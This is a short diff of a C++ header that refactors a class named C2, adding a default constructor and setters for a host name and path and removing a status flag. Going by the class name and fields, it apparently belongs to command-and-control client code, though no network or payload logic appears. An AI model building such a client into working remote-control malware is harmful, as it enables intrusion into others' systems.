@@ -8,10 +8,7 @@ using namespace std;
 
 
 class C2 {
-
-	BOOL failed;
 	string response;
-
 
 	LPCSTR hostName;
 	LPCSTR pathName;
@@ -22,7 +19,10 @@ class C2 {
 
 public:
 	DWORD error = NULL;
+	C2() {};
 	C2(LPCSTR hostName, LPCSTR pathName) :hostName(hostName), pathName(pathName) {};
+	void setHostName(LPCSTR hostName);
+	void setPathName(LPCSTR pathName);
 	void execute();
 	void cleanup();
 };
